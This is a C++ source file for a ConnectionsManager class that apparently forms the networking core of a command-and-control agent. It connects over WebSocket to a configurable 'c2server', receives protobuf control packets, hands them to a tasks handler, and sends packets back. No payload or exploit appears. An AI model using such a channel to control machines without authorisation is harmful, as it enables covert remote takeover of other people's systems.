//
// Created by alsah on 16.03.23.
//

#include "ConnectionsManager.h"
#include <utility>


ConnectionConfig::ConnectionConfig(
        std::string connectionId,
        std::string endpoint
        ) : connectionId(std::move(connectionId)), endpoint(std::move(endpoint)) {}

std::string ConnectionConfig::getUrl() const {
    return "ws://" + c2server + '/' + endpoint + '/' + connectionId;
}

ConnectionsManager::ConnectionsManager(ConnectionConfig config) : config(std::move(config)) {


    C2ServerChannelConfiguration cfg( // TODO add valid handlers
            [](){
                std::cout << "c2Server channel closed" << std::endl;
                },
            [](){
                std::cout << "c2Server channel opened" << std::endl;
                },
            [this](std::vector<std::byte> data){
                handleC2ServerMessage(data);
                },
                60
            );
    c2ServerChannel = std::make_unique<C2ServerChannel>(cfg);
}

ConnectionsManager::~ConnectionsManager() {
    c2ServerChannel->close();
}

void ConnectionsManager::start(const std::string& c2server) {
    config.c2server = c2server;
    c2ServerChannel->open(config.getUrl(), true);
}

void ConnectionsManager::stop() {
    c2ServerChannel->close();
}

void ConnectionsManager::setTasksHandler(std::shared_ptr<IControlPacketHandler> tasksRegisterPtr) {
    this->packetsHandler = std::move(tasksRegisterPtr);
}

void ConnectionsManager::handleC2ServerMessage(std::vector<std::byte> &data) {

    msgs::NetworkMessage message{};

    bool res = message.ParseFromArray(data.data(), static_cast<int>(data.size()));

    if(!res){
        std::cout << "Failed to parse inbox network message"; // TODO: log
        return;
    }

    switch (message.data_case()) {

        case msgs::NetworkMessage::kControl:
            std::cout << "received control packet; passing to the tasks manager "  << std::endl;
            packetsHandler->handleInbox(message.control());
            break;
        case msgs::NetworkMessage::kSignaling:
            std::cout << "received signaling message; not implemented" << std::endl;
            break;
        case msgs::NetworkMessage::DATA_NOT_SET:
            std::cout << "received undefined message; ignoring ..." << std::endl;
            return;
    }
}

void ConnectionsManager::send(const msgs::ControlPacket& data) {

    // step 1: create network message
    msgs::NetworkMessage message{};
    message.mutable_control()->CopyFrom(data);

    // step 2: serialize network message
    const std::string serializedString = message.SerializeAsString();
    std::vector<std::byte> bytes;
    bytes.reserve(serializedString.size());

    std::transform(
            std::begin(serializedString),
            std::end(serializedString),
            std::back_inserter(bytes),
            [](char byteChar){ return std::byte(byteChar);
    });

    // step 3: send serialized data
    c2ServerChannel->send(bytes);
}